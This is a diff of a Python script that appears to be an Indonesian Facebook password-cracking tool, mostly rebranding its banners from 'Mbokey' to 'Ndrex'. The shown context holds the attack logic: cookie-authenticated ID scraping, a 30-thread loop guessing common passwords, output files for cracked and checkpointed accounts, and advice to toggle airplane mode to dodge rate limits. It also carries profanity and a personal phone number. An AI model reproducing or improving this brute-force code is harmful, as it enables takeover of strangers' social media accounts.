@@ -36,15 +36,15 @@ def aink(s):
 
 time.sleep(0.1)
 print("""\033[95m╔═════════════════════════════════════════════╗
-\033[95m║ \033[97m *\033[96mAuthor\033[97m║\033[97m         Ndrex                                ║
-\033[95m║ \033[97m *\033[96m11/12 \033[97m║\033[97m HELLO WORLD                        ║
-\033[95m║ \033[97m *\033[96m2023 \033[97m  ║\033[97mKonmtol Keparat                      ║
-\033[95m║ \033[97m *\033[96mWhatSapp\033[ ║\033[97mMY NAME IS NDREX                ║
+\033[95m║ \033[97m *\033[96mAuthor\033[97m║\033[97mNdrex\033[95m                        ║
+\033[95m║ \033[97m *\033[96mCodex\033[97m ║\033[97mPemula Yg Di Bully\033[95m ║
+\033[95m║ \033[97m *\033[96mBy\033[97m       ║\033[97mKonmtol Keparat\033[95m     ║
+\033[95m║ \033[97m *\033[96mNdrex\033[95m ║\033[97mMY NAME IS NDREX               ║
 \033[95m╚═════════════════════════════════════════════╝""")
-print("\033[95m║ \033[97m-\033[96mN\033[97m-\033[96mD\033[97m-\033[96mR\033[97m-\033[96mE\033[97m-\033[96mX\033[97m║")
+print("\033[95m║ \033[97m-\033[96mN\033[97m-\033[96mD\033[97m-\033[96mR\033[97m-\033[96mE\033[97m-\033[96mX\033[97m-║")
 print("\033[92m*Bila Belum Mengetahui Pasword Chat Di Whatsapp")
 print("\033[92m*Whatsapp Saya:+62 852-5677-4185")
-print("\033[92m*xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx") 
+print("\033[92m*xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx*") 
 print("\033[92mChet Gw Ye Kontol Jangan Maen Nyolong Aje")
 
 
@@ -94,16 +94,16 @@ def fail():
 def peak():
     time.sleep(0.1)
     print("""
-\033[95m_   __    __
-\033[95m   / | / /___/ /_______  _  __
-\033[95m  /  |/ / __  / ___/ _ \| |/_/
-\033[95m / /|  / /_/ / /  /  __/>  <
+\033[95m        _   __    __
+\033[95m      / | / /___/ /_______  _  __
+\033[95m    /  |/ / __  / ___/ _ \| |/_/
+\033[95m  / /|  / /_/ / /  /  __/>  <
 \033[95m/_/ |_/\__,_/_/   \___/_/|_|
- \033[95m_____ ___   ____________
-\033[95m  / ___//   | / ____/ ____/
- \033[95m \__ \/ /| |/ / __/ __/
-\033[95m ___/ / ___ / /_/ / /___
-\033[95m/____/_/  |_\____/_____/ """)
+ \033[95m\033[95m\033[95m  _____ ___   ____________
+\033[95m\033[95m\033[95m / ___//   | / ____/ ____/
+ \033[95m\033[95m\033[95m\__ \/ /| |/ / __/ __/
+\033[95m\033[95m\033[95m  ___/ / ___ / /_/ / /___
+\033[95m\033[95m\033[96m/____/_/  |_\____/_____/ """)
 
 def mbfv2():
     time.sleep(0.1)
@@ -206,7 +206,7 @@ def mbfv2():
              else:
                    die += 1
              for i in list('+×'):
-                            print(f"\r\033[00m [\033[1;91m{i}\033[00m] \033[96mProses : \033[90m[\033[1;94m{str(die)}\033[90m] \033[93mMbokey \033[91m: \033[90m[\033[1;93m{str(check)}\033[90m] \033[92mLive \033[91m: \033[90m[\033[1;92m{str(result)}\033[90m]\033[00m",end="")
+                            print(f"\r\033[00m [\033[1;91m{i}\033[00m] \033[96mProses : \033[90m[\033[1;94m{str(die)}\033[90m] \033[93mNdrex \033[91m: \033[90m[\033[1;93m{str(check)}\033[90m] \033[92mLive \033[91m: \033[90m[\033[1;92m{str(result)}\033[90m]\033[00m",end="")
                             time.sleep(0.2)
          def getid(url):
              raw = requests.get(url,cookies=kuki).content
@@ -299,7 +299,7 @@ def mbfv2():
                          print("\n\n\033[95m [\033[91m!\033[95m] \033[96mHarus dipilih!")
                          uwutc()
                    elif doge == '0' or doge =='00':
-                         aink("\n\033[1;92m Terima kasih sudah menggunakan server.\n  Dan kamu harus bantu folow facebook Mbokey...\n\n")
+                         aink("\n\033[1;92m Terima kasih sudah menggunakan server.\n  Dan kamu harus bantu folow facebook Ndrex...\n\n")
                          os.system('xdgu-open  https://www.facebook.com/NDREX.KING.OF.THE.TAUHID')
                          exit()                   	
                    elif doge == '7' or doge =='07':
@@ -389,7 +389,7 @@ def mbfv2():
                    fail()
                    peak()
                    print('\033[96mSemua ID\x1b[1;91m :\033[96m ' + str(len(id)) + "\n\033[92m \n",end="")
-                   print('\n\033[95m [\033[1;92m+\033[95m] \033[96mhasil\033[92m Live\033[93m disimpan di \033[91m: \033[92mLive.txt\n \033[92m[\033[93m-\033[92m] \033[96mhasil\x1b[1;93m Mbokey\033[92m disimpan di \033[91m: \033[92mcp.txt')
+                   print('\n\033[95m [\033[1;92m+\033[95m] \033[96mhasil\033[92m Live\033[93m disimpan di \033[91m: \033[92mLive.txt\n \033[92m[\033[93m-\033[92m] \033[96mhasil\x1b[1;93mNdrex\033[92m disimpan di \033[91m: \033[92mcp.txt')
                    print('\n [\x1b[1;91m▪\x1b[1;95m] \033[92mMainkan Mode Pesawat 3 Detik Untuk Menjeda Proces Creck\n')
                    with ThreadPoolExecutor(max_workers=30) as ex:
                           for user in username:
@@ -405,9 +405,7 @@ def mbfv2():
                                                      str(x) + '123456',
                                                           'sayang',
                                                            'kontol',
-                                                           'anjing',
-                                                           'cinta',
-                                                           'Indonesia',
+                                                           'anjing', 
                                                   ]
                                           listpass.append(expass)
                                           for passw in set(listpass):
